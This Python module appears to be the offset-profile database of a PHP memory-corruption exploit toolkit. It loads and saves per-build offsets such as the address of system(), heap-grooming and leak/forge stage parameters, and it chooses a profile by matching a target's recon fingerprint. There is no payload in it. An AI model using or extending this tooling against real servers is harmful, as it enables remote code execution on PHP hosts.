"""Profile-based offset database for PHP builds.

Each profile is a JSON file in the profiles/ directory containing offsets,
staging parameters, and metadata for a specific PHP build. Profiles are
auto-selected based on recon fingerprint matching.

Custom profiles can be added to profiles/ or loaded from an external directory.
"""
from __future__ import annotations

import json
import os
from dataclasses import dataclass, field
from pathlib import Path

PROFILES_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "profiles")


@dataclass
class Profile:
    name: str
    php_version: str
    os: str
    arch: str
    sapi: str
    zif_system: int
    zval_ptr_dtor: int
    memory_limit: str = "128M"
    status: str = "unverified"  # verified, unverified, untested
    source_file: str = ""
    # Stage parameters (calibrated for this build)
    a1_big: int = 78
    a2_parts: int = 880
    a2_depth: int = 64
    a2_fillers: int = 115
    leak_fake_len: int = 0xC8000
    leak_spec: str = ""  # empty = use default LEAK_SPEC_128M
    forge_vl: int = 384
    forge_n1: int = 500
    forge_n2: int = 495
    ht_offset: int = 0xF8398
    notes: str = ""


def _load_profile_file(path: str) -> Profile:
    """Load a single profile from a JSON file."""
    with open(path) as f:
        d = json.load(f)

    offsets = d.get("offsets", {})
    stages = d.get("stages", {})

    def _hex_or_int(v):
        if isinstance(v, str):
            return int(v, 16)
        return int(v)

    return Profile(
        name=d.get("name", os.path.basename(path)),
        php_version=d.get("php_version", ""),
        os=d.get("os", ""),
        arch=d.get("arch", "amd64"),
        sapi=d.get("sapi", "mod_php"),
        zif_system=_hex_or_int(offsets.get("zif_system", 0)),
        zval_ptr_dtor=_hex_or_int(offsets.get("zval_ptr_dtor", 0)),
        memory_limit=d.get("memory_limit", "128M"),
        status=d.get("status", "unverified"),
        source_file=path,
        a1_big=stages.get("a1_big", 78),
        a2_parts=stages.get("a2_parts", 880),
        a2_depth=stages.get("a2_depth", 64),
        a2_fillers=stages.get("a2_fillers", 115),
        leak_fake_len=_hex_or_int(stages.get("leak_fake_len", "0xC8000")),
        forge_vl=stages.get("forge_vl", 384),
        forge_n1=stages.get("forge_n1", 500),
        forge_n2=stages.get("forge_n2", 495),
        ht_offset=_hex_or_int(stages.get("ht_offset", "0xF8398")),
        notes=d.get("notes", ""),
    )


def _save_profile_file(profile: Profile, path: str):
    """Save a profile to a JSON file."""
    d = {
        "name": profile.name,
        "php_version": profile.php_version,
        "os": profile.os,
        "arch": profile.arch,
        "sapi": profile.sapi,
        "offsets": {
            "zif_system": f"0x{profile.zif_system:x}",
            "zval_ptr_dtor": f"0x{profile.zval_ptr_dtor:x}",
        },
        "stages": {
            "a1_big": profile.a1_big,
            "a2_parts": profile.a2_parts,
            "a2_depth": profile.a2_depth,
            "a2_fillers": profile.a2_fillers,
            "leak_fake_len": f"0x{profile.leak_fake_len:x}",
            "forge_vl": profile.forge_vl,
            "forge_n1": profile.forge_n1,
            "forge_n2": profile.forge_n2,
            "ht_offset": f"0x{profile.ht_offset:x}",
        },
        "memory_limit": profile.memory_limit,
        "status": profile.status,
        "notes": profile.notes,
    }
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        json.dump(d, f, indent=2)
        f.write("\n")


class ProfileDB:
    """Profile database with fuzzy matching by recon fingerprint."""

    def __init__(self, profiles_dir: str = PROFILES_DIR):
        self.profiles: list[Profile] = []
        self.profiles_dir = profiles_dir
        self._load_all()

    def _load_all(self):
        """Load all profiles from the profiles directory."""
        if not os.path.isdir(self.profiles_dir):
            return
        for fname in sorted(os.listdir(self.profiles_dir)):
            if fname.endswith(".json"):
                try:
                    p = _load_profile_file(os.path.join(self.profiles_dir, fname))
                    self.profiles.append(p)
                except (json.JSONDecodeError, KeyError, ValueError):
                    pass

    def match(self, php_version: str = "", os_hint: str = "",
              arch: str = "", sapi: str = "",
              memory_limit: str = "") -> Profile | None:
        """Find the best matching profile for a recon fingerprint.

        Matching priority:
          1. Exact version + OS + arch match
          2. Exact version + arch (any OS)
          3. Same major.minor, closest patch, same arch
          4. Any profile with matching arch (last resort)
        """
        if not self.profiles:
            return None

        os_norm = _normalize_os(os_hint)
        arch_norm = _normalize_arch(arch)

        # Score each profile
        scored = []
        for p in self.profiles:
            score = 0
            p_arch = _normalize_arch(p.arch)

            # Architecture must match (hard requirement)
            if arch_norm and p_arch != arch_norm:
                continue

            # Version matching
            if p.php_version == php_version:
                score += 100
            elif php_version:
                pv = php_version.split(".")
                pp = p.php_version.split(".")
                if len(pv) >= 2 and len(pp) >= 2 and pv[:2] == pp[:2]:
                    score += 50 - min(abs(int(pv[2]) - int(pp[2])), 50) if len(pv) > 2 and len(pp) > 2 else 0

            # OS matching
            p_os = _normalize_os(p.os)
            if os_norm and p_os == os_norm:
                score += 30
            elif os_norm and p_os and os_norm.split("-")[0] == p_os.split("-")[0]:
                score += 15

            # SAPI matching
            if sapi and p.sapi and sapi.lower() in p.sapi.lower():
                score += 10

            # Memory limit matching
            if memory_limit and p.memory_limit == memory_limit:
                score += 5

            # Prefer verified profiles
            if p.status == "verified":
                score += 20

            if score > 0:
                scored.append((score, p))

        if not scored:
            return None

        scored.sort(key=lambda x: -x[0])
        return scored[0][1]

    def add_profile(self, profile: Profile, save: bool = True) -> str:
        """Add a new profile and optionally save it to disk.

        Returns the path to the saved profile file.
        """
        self.profiles.append(profile)
        if save:
            fname = profile.name.replace(" ", "-").replace("/", "-") + ".json"
            path = os.path.join(self.profiles_dir, fname)
            _save_profile_file(profile, path)
            profile.source_file = path
            return path
        return ""

    def list_profiles(self) -> list[Profile]:
        return sorted(self.profiles, key=lambda p: (p.php_version, p.os))


def _normalize_os(s: str) -> str:
    h = s.lower().strip()
    if "debian" in h:
        if "13" in h or "trixie" in h:
            return "debian-trixie"
        if "12" in h or "bookworm" in h:
            return "debian-bookworm"
        return "debian"
    if "ubuntu" in h:
        if "24" in h or "noble" in h:
            return "ubuntu-noble"
        if "22" in h or "jammy" in h:
            return "ubuntu-jammy"
        return "ubuntu"
    if "alpine" in h:
        return "alpine"
    if "rhel" in h or "red hat" in h or "centos" in h:
        return "rhel"
    return h


def _normalize_arch(s: str) -> str:
    a = s.lower().strip()
    if a in ("x86_64", "amd64", "x64"):
        return "amd64"
    if a in ("aarch64", "arm64"):
        return "arm64"
    return a
